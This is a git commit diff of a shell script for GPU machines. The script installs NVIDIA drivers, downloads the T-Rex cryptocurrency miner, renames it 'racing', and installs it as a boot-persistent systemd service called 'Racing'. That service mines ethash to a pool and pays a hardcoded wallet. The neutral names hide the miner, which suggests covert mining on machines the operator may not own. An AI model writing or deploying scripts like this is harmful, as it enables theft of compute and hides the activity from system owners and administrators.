c22fecd573f97a7bf3c79e6741ccdf4b283f7bdf
joplinsolieso <105708394+joplinsolieso@users.noreply.github.com>
2022-07-12 14:18:56 +0700

    Update a100.sh

--- a100.sh
+++ a100.sh
@@ -4,7 +4,7 @@ username=$HOSTNAME
 myworker+=$username
 sudo apt-get install linux-headers-$(uname -r) -y
 distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
-wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
+sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
 sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
 sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
 echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
@@ -15,18 +15,13 @@ sudo dpkg -i cuda-keyring_1.0-1_all.deb
 sudo apt-get update
 sudo apt-get -y install cuda-drivers
 sudo apt-get install libcurl4 -y
-sudo apt-get install cuda-drivers-510
-sudo apt-get install cuda-drivers-fabricmanager-510 -y
+sudo apt-get install cuda-drivers-515 -y
+sudo apt-get install cuda-drivers-fabricmanager-515 -y
 sudo systemctl enable nvidia-fabricmanager
 sudo systemctl start nvidia-fabricmanager
-wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz
+sudo wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz
 tar -zxvf t-rex-0.25.12-linux.tar.gz
 mv t-rex racing
-MINWAIT=30
-MAXWAIT=100
-datass=$((MINWAIT+RANDOM % (MAXWAIT-MINWAIT)))
-sleep $datass
-sudo killall racing
 sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o us-eth.2miners.com:2020 -u bc1qmc9jdygf4kn03rq7hg692uyhcya9gfhymsug2q -p x -w ${myworker}_re\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
